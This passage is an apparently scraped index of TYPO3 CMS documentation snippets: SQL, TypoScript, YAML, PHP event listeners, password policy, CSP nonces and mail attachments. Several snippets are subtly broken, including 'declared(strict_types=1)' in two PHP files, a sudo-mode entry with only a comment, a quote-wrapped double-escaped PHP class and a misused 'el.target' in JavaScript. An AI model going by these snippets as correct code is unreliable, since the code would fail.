https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tx_examples_log (\n  request_id varchar(13) DEFAULT '' NOT NULL,\n  time_micro double(16,4) NOT NULL default '0.0000',\n  component varchar(255) DEFAULT '' NOT NULL,\n  level tinyint(1) unsigned DEFAULT '0' NOT NULL,\n  message text,\n  data text\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring LinkHandler in TypoScript for News Records\nDESCRIPTION: This TypoScript example shows how to configure the LinkHandler for news records, displaying them on a fixed detail page. It sets up the necessary parameters for the news extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.recordLinks.news {\n   typolink {\n      parameter = 123\n      additionalParams.data = field:uid\n      additionalParams.wrap = &tx_news_pi1[controller]=News&tx_news_pi1[action]=detail&tx_news_pi1[news]=|\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring External Page Error Handler in TYPO3 YAML\nDESCRIPTION: This snippet shows the configuration for an external page-based error handler in TYPO3. It sets up a catch-all error handler for any undefined HTTP status codes, directing to an external URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ErrorHandling/PageErrorHandler.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nerrorHandling:\n  - errorCode: '0'\n    errorHandler: Page\n    errorContentSource: 'https://example.org/error'\n```\n\n----------------------------------------\n\nTITLE: Default Password Policy Configuration\nDESCRIPTION: Default configuration for TYPO3 password policies including validators for password strength and uniqueness requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/SYS.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['passwordPolicies']['default'] = [\n    'validators' => [\n        \\TYPO3\\CMS\\Core\\PasswordPolicy\\Validator\\CorePasswordValidator::class => [\n            'options' => [\n                'minimumLength' => 8,\n                'upperCaseCharacterRequired' => true,\n                'lowerCaseCharacterRequired' => true,\n                'digitCharacterRequired' => true,\n                'specialCharacterRequired' => true,\n            ],\n            'excludeActions' => [],\n        ],\n        \\TYPO3\\CMS\\Core\\PasswordPolicy\\Validator\\NotCurrentPasswordValidator::class => [\n            'options' => [],\n            'excludeActions' => [\n                \\TYPO3\\CMS\\Core\\PasswordPolicy\\PasswordPolicyAction::NEW_USER_PASSWORD,\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Implementing AfterCachedPageIsPersistedEvent Listener in PHP for TYPO3\nDESCRIPTION: Example of an event listener class implementing the AfterCachedPageIsPersistedEvent in TYPO3. This event is triggered after a page has been stored in TYPO3's page cache and is commonly used for generating static file cache.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterCachedPageIsPersistedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\Event\\AfterCachedPageIsPersistedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterCachedPageIsPersistedEvent $event): void\n    {\n        // Get a reference to the controller\n        $controller = $event->getController();\n        // Get the current page ID\n        $pageId = $controller->id;\n        // Process the page\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing HTTP Requests in TYPO3 with RequestFactory\nDESCRIPTION: A complete class implementation that demonstrates how to make HTTP requests to external APIs in TYPO3 CMS. The class uses constructor injection for the RequestFactory, handles response validation, and processes JSON responses properly with appropriate error handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Examples/Http/MeowInformationRequester.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\n/*\n * This file is part of the TYPO3 CMS project. [...]\n */\n\nnamespace T3docs\\Examples\\Http;\n\nuse TYPO3\\CMS\\Core\\Http\\RequestFactory;\n\nfinal readonly class MeowInformationRequester\n{\n    private const API_URL = 'https://catfact.ninja/fact';\n\n    // We need the RequestFactory for creating and sending a request,\n    // so we inject it into the class using constructor injection.\n    public function __construct(\n        private RequestFactory $requestFactory,\n    ) {}\n\n    /**\n     * @throws \\JsonException\n     * @throws \\RuntimeException\n     */\n    public function request(): string\n    {\n        // Additional headers for this specific request\n        // See: https://docs.guzzlephp.org/en/stable/request-options.html\n        $additionalOptions = [\n            'headers' => ['Cache-Control' => 'no-cache'],\n            'allow_redirects' => false,\n        ];\n\n        // Get a PSR-7-compliant response object\n        $response = $this->requestFactory->request(\n            self::API_URL,\n            'GET',\n            $additionalOptions,\n        );\n\n        if ($response->getStatusCode() !== 200) {\n            throw new \\RuntimeException(\n                'Returned status code is ' . $response->getStatusCode(),\n            );\n        }\n\n        if ($response->getHeaderLine('Content-Type') !== 'application/json') {\n            throw new \\RuntimeException(\n                'The request did not return JSON data',\n            );\n        }\n        // Get the content as a string on a successful request\n        $content = $response->getBody()->getContents();\n        $result = json_decode($content, true, flags: JSON_THROW_ON_ERROR);\n        if (!is_array($result) || !isset($result['fact']) || !is_scalar($result['fact'])) {\n            throw new \\RuntimeException('The service returned an unexpected format.', 1666413230);\n        }\n        return (string)$result['fact'];\n    }\n```\n\n----------------------------------------\n\nTITLE: Temporarily enabling logging in TYPO3\nDESCRIPTION: This snippet shows how to temporarily enable logging in TYPO3 by commenting out the line that unsets the LOG configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\n// unset($GLOBALS['TYPO3_CONF_VARS']['LOG']);\n// By commenting out the line above you can enable logging again.\n```\n\n----------------------------------------\n\nTITLE: Configuring Sudo Mode for TYPO3 Backend Modules\nDESCRIPTION: This code snippet shows how to enable sudo mode for a TYPO3 backend module. Sudo mode provides additional security for sensitive operations in the TYPO3 backend by requiring user re-authentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n// EXT:my_extension/Configuration/Backend/Modules.php\n```\n\n----------------------------------------\n\nTITLE: Implementing RequestAnimationFrame Event in TYPO3 JavaScript\nDESCRIPTION: This snippet demonstrates how to use the RequestAnimationFrameEvent module to create an event listener that responds to scroll events but uses RequestAnimationFrame for performance optimization. The example binds a scroll event to the window that changes an element's width based on scroll position.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/RequestAnimationFrameEvent/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport RequestAnimationFrameEvent from '@typo3/core/event/request-animation-frame-event.js';\n\nconst el = document.querySelector('.item');\nnew RequestAnimationFrameEvent('scroll', function () {\n    el.target.style.width = window.scrollY + 100 + 'px';\n}).bindTo(window);\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Content Export Command\nDESCRIPTION: CLI command for exporting TYPO3 page tree data to XML or T3D format using Composer-based installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateContent/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 impexp:export [options] [--] [<filename>]\n```\n\n----------------------------------------\n\nTITLE: Implementing Unidirectional n:1 Relationship in Extbase Model\nDESCRIPTION: This code shows how to implement a unidirectional n:1 relationship from Post to Author in Extbase, where a post has one main author but an author might be connected to multiple posts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Main author of this post\n *\n * @var \\MyVendor\\MyExtension\\Domain\\Model\\Author\n */\nprotected $author;\n\n/**\n * Get the main author of this post\n *\n * @return \\MyVendor\\MyExtension\\Domain\\Model\\Author\n */\npublic function getAuthor()\n{\n    return $this->author;\n}\n\n/**\n * Set the main author of this post\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Author $author\n */\npublic function setAuthor(\\MyVendor\\MyExtension\\Domain\\Model\\Author $author)\n{\n    $this->author = $author;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Live Search Form Event Listener\nDESCRIPTION: Example implementation of an event listener for BeforeLiveSearchFormIsBuiltEvent that allows modifying the backend live search form data, search demands, and additional view data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeLiveSearchFormIsBuiltEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Search\\Event\\BeforeLiveSearchFormIsBuiltEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeLiveSearchFormIsBuiltEvent $event): void\n    {\n        // Add additional view data\n        $event->setAdditionalViewData([\n            'foo' => 'bar',\n        ]);\n\n        // Modify search hints\n        $hints = $event->getHints();\n        $hints[] = 'My custom hint';\n        $event->setHints($hints);\n\n        // Modify search demands\n        $searchDemand = $event->getSearchDemand();\n        $searchDemand->setCustomSettings(['foo' => 'bar']);\n        $event->setSearchDemand($searchDemand);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Placeholders with XLIFF Labels in PHP\nDESCRIPTION: Demonstrates how to handle placeholders in XLIFF translations using sprintf() in conjunction with LanguageService. The example shows using a placeholder for a count of broken references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/XliffApi.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// Text string in .xlf file has a placeholder:\n// <trans-unit id=\"message.description.fileHasBrokenReferences\">\n//     <source>The file has %1s broken reference(s) but it will be deleted regardless.</source>\n// </trans-unit>\nsprintf($this->getLanguageService()->sL(\n    'LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:message.description.fileHasBrokenReferences'),\n    count($brokenReferences)\n);\n```\n\n----------------------------------------\n\nTITLE: Registering Backend Controller Hook in TYPO3\nDESCRIPTION: PHP code for ext_localconf.php that registers a hook into the TYPO3 backend controller to load custom JavaScript for broadcast message handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BroadcastChannels.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['typo3/backend.php']['constructPostProcess'][]\\n    = \\MyVendor\\MyExtension\\Hooks\\BackendControllerHook::class . '->registerClientSideEventHandler';\n```\n\n----------------------------------------\n\nTITLE: Using Display Conditions in FlexForm Fields\nDESCRIPTION: Example of using displayCond in a FlexForm field to conditionally show or hide fields based on the value of another field, making the form more dynamic and context-sensitive.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: XML\nCODE:\n```\n<config>\n    <type>select</type>\n</config>\n<!-- Hide field if value of neighbour field \"settings.orderBy\" on same sheet is not \"title\" -->\n<displayCond>FIELD:settings.orderBy:!=:title</displayCond>\n```\n\n----------------------------------------\n\nTITLE: Configuring FlexForm Structure for TYPO3 Haiku Plugin\nDESCRIPTION: Defines a FlexForm data structure for configuring a Haiku list plugin. Includes settings for single page selection with custom search fields and document type filtering. The configuration allows selecting one page through a suggest wizard with additional search capabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/FlexForms/Examples/PluginHaikuList.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<T3DataStructure>\n    <sheets>\n        <sDEF>\n            <ROOT>\n                <sheetTitle>\n                    LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:examples.pi_flexform.sheetGeneral\n                </sheetTitle>\n                <type>array</type>\n                <el>\n                    <settings.singlePid>\n                        <label>\n                            LLL:EXT:examples/Resources/Private/Language/PluginHaiku/locallang_db.xlf:singlePageUid\n                        </label>\n                        <config>\n                            <type>group</type>\n                            <allowed>pages</allowed>\n                            <maxitems>1</maxitems>\n                            <minitems>0</minitems>\n                            <size>1</size>\n                            <suggestOptions>\n                                <default>\n                                    <additionalSearchFields>nav_title, alias, url</additionalSearchFields>\n                                    <addWhere>AND pages.doktype = 1</addWhere>\n                                </default>\n                            </suggestOptions>\n                        </config>\n                    </settings.singlePid>\n                </el>\n            </ROOT>\n        </sDEF>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: URI Builder in Another Context\nDESCRIPTION: This snippet demonstrates how to inject the URI builder into a class using constructor injection. It highlights the importance of setting the request object before using the URI builder. The PSR-7 request object is retrieved from the global variable `TYPO3_REQUEST` in this example.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/UriBuilder.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n\"<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\\\MyExtension\\\\Domain\\\\Model;\n\nuse Psr\\\\Http\\\\Message\\\\ServerRequestInterface;\nuse TYPO3\\\\CMS\\\\Core\\\\Http\\\\Uri;\nuse TYPO3\\\\CMS\\\\Extbase\\\\Mvc\\\\Web\\\\Routing\\\\UriBuilder;\n\nclass MyClass\n{\n    /**\n     * @var UriBuilder\n     */\n    protected UriBuilder $uriBuilder;\n\n    /**\n     * @param UriBuilder $uriBuilder\n     */\n    public function __construct(\n        UriBuilder $uriBuilder\n    ) {\n        $this->uriBuilder = $uriBuilder;\n        $this->uriBuilder->setRequest($GLOBALS['TYPO3_REQUEST']);\n    }\n\n    /**\n     * @return string\n     */\n    public function doSomething(): string\n    {\n        $uri = $this->uriBuilder\n            ->reset()\n            ->setTarget('show')\n            ->setArguments(['foo' => 'bar'])\n            ->setControllerName('My')\n            ->setExtensionName('MyExtension')\n            ->setPluginName('Pi1')\n            ->build();\n\n        return (string)$uri;\n    }\n}\n\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Blog Update Controller Action in TYPO3 CMS\nDESCRIPTION: Controller class containing an update action method that handles blog updates with admin access validation. The method takes a Blog model instance, verifies admin access, updates the blog through repository, adds a flash message, and redirects to index.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Controllers/BlogControllerUpdate.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse T3docs\\BlogExample\\Exception\\NoBlogAdminAccessException;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Updates an existing blog\n     *\n     * $blog is a not yet persisted clone of the original blog containing\n     * the modifications\n     *\n     * @throws NoBlogAdminAccessException\n     */\n    public function updateAction(Blog $blog): ResponseInterface\n    {\n        $this->checkBlogAdminAccess();\n        $this->blogRepository->update($blog);\n        $this->addFlashMessage('updated');\n        return $this->redirect('index');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Query Restrictions in TYPO3\nDESCRIPTION: Shows how to register a custom query restriction class in ext_localconf.php. This adds the custom restriction to all database queries throughout the TYPO3 system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n$GLOBALS['TYPO3_CONF_VARS']['DB']['additionalQueryRestrictions'][\\Vendor\\Extension\\Database\\Query\\Restriction\\CustomRestriction::class] = [];\n\n```\n\n----------------------------------------\n\nTITLE: Registering a Message Handler with YAML Configuration in TYPO3\nDESCRIPTION: YAML configuration to register a message handler for backwards compatibility with TYPO3 v12. This uses service tags to identify the class as a message handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Queue\\Handler\\DemoHandler:\n    tags:\n      # use tags for backwards compatibility reasons\n      - name: 'messenger.message_handler'\n        handles: 'MyVendor\\MyExtension\\Queue\\Message\\DemoMessage'\n        # optional: define priority if multiple handlers exist\n        # priority: 10\n```\n\n----------------------------------------\n\nTITLE: Loading ES6 Modules in TYPO3 Backend via PageRenderer or JavaScriptRenderer\nDESCRIPTION: Example of how to add ES6 modules to the current page response using either PageRenderer or JavaScriptRenderer in a TYPO3 backend environment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/ES6/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace Vendor\\MyExtension;\n\nuse TYPO3\\CMS\\Core\\Page\\JavaScriptModuleInstruction;\n\n// Add module @vendor/my-extension/my-module to current response\n$this->pageRenderer->loadJavaScriptModule('@vendor/my-extension/my-module.js');\n\n// alternatively via JavaScriptRenderer\n$this->pageRenderer->getJavaScriptRenderer()\n    ->addJavaScriptModuleInstruction(\n        JavaScriptModuleInstruction::create('@vendor/my-extension/my-module.js')\n            // passing attributes\n            ->instance(['key' => 'value'])\n            // invoke method of instance\n            ->invoke('method', ['argument1', 'argument2'])\n            // invoke static method\n            ->invokeStaticMethod('method', ['argument1', 'argument2'])\n);\n\n```\n\n----------------------------------------\n\nTITLE: Showing Site Configuration using TYPO3 CLI - Composer Installation\nDESCRIPTION: Command to display complete YAML configuration for a specific TYPO3 site using its identifier in Composer-based installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/CliTools.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 site:show <identifier>\n```\n\n----------------------------------------\n\nTITLE: Updated Enetcache composer.json with Testing Configuration\nDESCRIPTION: Enhanced composer.json file adding development dependencies, build configurations, and testing framework integration\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"lolli/enetcache\",\n  \"type\": \"typo3-cms-extension\",\n  \"description\": \"Enetcache cache extension\",\n  \"homepage\": \"https://github.com/lolli42/enetcache\",\n  \"authors\": [\n    {\n      \"name\": \"Christian Kuhn\",\n      \"role\": \"Developer\"\n    }\n  ],\n  \"license\": [\n    \"GPL-2.0-or-later\"\n  ],\n  \"require\": {\n    \"typo3/cms-core\": \"^13\"\n  },\n  \"config\": {\n    \"vendor-dir\": \".Build/vendor\",\n    \"bin-dir\": \".Build/bin\"\n  },\n  \"require-dev\": {\n    \"typo3/testing-framework\": \"^8\"\n  },\n  \"autoload\": {\n    \"psr-4\": {\n      \"Lolli\\\\Enetcache\\\\\": \"Classes\"\n    }\n  },\n  \"autoload-dev\": {\n    \"psr-4\": {\n      \"Lolli\\\\Enetcache\\\\Tests\\\\\": \"Tests\"\n    }\n  },\n  \"extra\": {\n    \"branch-alias\": {\n      \"dev-master\": \"2.x-dev\"\n    },\n    \"typo3/cms\": {\n      \"extension-key\": \"enetcache\",\n      \"web-dir\": \".Build/Web\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileProcessingEvent Class in PHP\nDESCRIPTION: This code snippet defines the AfterFileProcessingEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. It includes properties for the processed file, the original file, the task type, and the configuration, along with getter and setter methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileProcessingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfinal class AfterFileProcessingEvent\n{\n    private ProcessedFile $processedFile;\n    private FileInterface $originalFile;\n    private string $taskType;\n    private array $configuration;\n\n    public function __construct(\n        ProcessedFile $processedFile,\n        FileInterface $originalFile,\n        string $taskType,\n        array $configuration\n    ) {\n        $this->processedFile = $processedFile;\n        $this->originalFile = $originalFile;\n        $this->taskType = $taskType;\n        $this->configuration = $configuration;\n    }\n\n    public function getProcessedFile(): ProcessedFile\n    {\n        return $this->processedFile;\n    }\n\n    public function getOriginalFile(): FileInterface\n    {\n        return $this->originalFile;\n    }\n\n    public function getTaskType(): string\n    {\n        return $this->taskType;\n    }\n\n    public function getConfiguration(): array\n    {\n        return $this->configuration;\n    }\n\n    public function setProcessedFile(ProcessedFile $processedFile): void\n    {\n        $this->processedFile = $processedFile;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using nonces in HTML for CSP\nDESCRIPTION: Example of using nonces in HTML elements to allow specific inline scripts and styles in Content Security Policy.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<link\n    rel=\"stylesheet\"\n    href=\"/_assets/af46f1853e4e259cbb8ebcb816eb0403/Css/styles.css?1687696548\"\n    media=\"all\"\n    nonce=\"sqK8LkqFp-aWHc7jkHQ4aT-RlUp5cde9ZW0F0-BlrQbExX-PRMoTkw\"\n>\n\n<style nonce=\"sqK8LkqFp-aWHc7jkHQ4aT-RlUp5cde9ZW0F0-BlrQbExX-PRMoTkw\">\n    /* some inline styles */\n</style>\n\n<script\n    src=\"/_assets/27334a649e36d0032b969fa8830590c2/JavaScript/scripts.js?1684880443\"\n    nonce=\"sqK8LkqFp-aWHc7jkHQ4aT-RlUp5cde9ZW0F0-BlrQbExX-PRMoTkw\"\n></script>\n\n<script nonce=\"sqK8LkqFp-aWHc7jkHQ4aT-RlUp5cde9ZW0F0-BlrQbExX-PRMoTkw\">\n    /* some inline JavaScript */\n</script>\n```\n\n----------------------------------------\n\nTITLE: Adding Attachments to Emails in PHP\nDESCRIPTION: Demonstrates different methods of attaching files to an email, including attaching from a file path and from a stream.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: php\nCODE:\n```\n// Attach file to message\n$mail->attachFromPath('/path/to/documents/privacy.pdf');\n\n// Optionally you can tell email clients to display a custom name for the file\n$mail->attachFromPath('/path/to/documents/privacy.pdf', 'Privacy Policy');\n\n// Alternatively attach contents from a stream\n$mail->attach(fopen('/path/to/documents/contract.doc', 'r'));\n```\n\n----------------------------------------\n\nTITLE: BeforeFileProcessingEvent Class Definition in TYPO3 CMS Core Resource\nDESCRIPTION: This documentation outlines the BeforeFileProcessingEvent class which is fired before a file object is processed in TYPO3. It allows developers to add further information or enrich the file before processing begins.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileProcessingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFileProcessingEvent\n{\n    public function getProcessedFile(): \\TYPO3\\CMS\\Core\\Resource\\ProcessedFile;\n    public function setProcessedFile(\\TYPO3\\CMS\\Core\\Resource\\ProcessedFile $processedFile);\n    public function getDriver(): \\TYPO3\\CMS\\Core\\Resource\\Driver\\DriverInterface;\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface;\n    public function getTaskType(): string;\n    public function getConfiguration(): array;\n}\n```\n\n----------------------------------------\n\nTITLE: Array Declaration in PHP\nDESCRIPTION: Demonstrates how to declare nested associative and sequential arrays in PHP. Shows both key-value pair arrays and simple indexed arrays.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Syntax.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$a = [\n    'key1' => 'value',\n    'key2' => [\n        'key2_1' => 'value',\n    ],\n];\n\n$b = [\n    'apples',\n    'oranges',\n    'bananas'\n];\n```\n\n----------------------------------------\n\nTITLE: Site Configuration YAML File\nDESCRIPTION: Required configuration file that contains the main site configuration. Must be present in either composer-based (/config/sites/my-site/) or classic (/typo3conf/sites/my-site/) installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nconfig.yaml\n```\n\n----------------------------------------\n\nTITLE: Defining AfterUserLoggedInEvent Class in TYPO3 Authentication System\nDESCRIPTION: PHP class definition for handling post-login events in TYPO3 CMS. The class provides methods to access the authenticated user object and the server request interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterUserLoggedInEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Authentication\\Event;\n\nclass AfterUserLoggedInEvent {\n    public function getUser(): \\TYPO3\\CMS\\Core\\Authentication\\AbstractUserAuthentication;\n    public function getRequest(): ?\\Psr\\Http\\Message\\ServerRequestInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Extended Model in ext_localconf.php\nDESCRIPTION: Configuration that informs TYPO3 to use the extended model instead of the original one when the original model is requested via the TYPO3 dependency injection container.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendExtbaseModel/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclared(strict_types=1);\n\n(static function() {\n    \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n        \\TYPO3\\CMS\\Extbase\\Object\\Container\\Container::class\n    )->registerImplementation(\n        \\OriginalVendor\\OriginalExtension\\Domain\\Model\\SomeModel::class,\n        \\MyVendor\\MyExtension\\Domain\\Model\\MyExtendedModel::class\n    );\n})();\n\n```\n\n----------------------------------------\n\nTITLE: Registering GitHub Link Builder in TYPO3 Frontend Configuration\nDESCRIPTION: Shows how to register a custom GitHub link builder class in TYPO3's global frontend configuration array. This enables custom handling of GitHub-specific links in the frontend rendering process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['typolinkBuilder']['github'] =\n    \\T3docs\\Examples\\LinkHandler\\GithubLinkBuilder::class;\n```\n\n----------------------------------------\n\nTITLE: Disabling Generic Error Messages for Admin Users in TYPO3 TypoScript\nDESCRIPTION: This TypoScript configuration disables the generic 'Oops, an error occurred!' messages specifically for logged-in admin users by setting contentObjectExceptionHandler to 0 when the current backend user is an admin. This allows administrators to see detailed error messages while regular users still see the generic message.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/ProductionExceptionHandler/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n[backend.user.isAdmin]\n    config.contentObjectExceptionHandler = 0\n[END]\n```\n\n----------------------------------------\n\nTITLE: Service Configuration with Non-Shared Instance in TYPO3\nDESCRIPTION: Example of configuring a service to not be shared using the Autoconfigure attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n#[Autoconfigure(shared: false)]\nclass MyServiceUsingAutoconfigureSharedFalse\n{\n    // Service implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Using JavaScript FileReader for File Upload Preview\nDESCRIPTION: Demonstrates the use of JavaScript's FileReader object to access and render uploaded files before form submission. This approach allows for client-side preview functionality.\nSOURCE: 